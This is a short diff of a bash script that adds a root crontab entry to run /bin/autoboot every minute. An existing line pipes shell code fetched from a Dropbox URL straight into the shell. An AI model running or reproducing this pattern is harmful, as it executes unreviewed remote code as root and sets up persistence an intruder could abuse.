@@ -6,6 +6,7 @@ clear
 echo '#!/bin/bash
 ' > /bin/autoboot
 chmod +x /bin/autoboot
+[[ -z $(cat /etc/crontab | grep "autoboot") ]] && echo "* * * * * root bash  /bin/autoboot" >> /etc/crontab
 }
 
 source <(curl -sSL https://www.dropbox.com/s/i32r4rvk9doay0x/module)
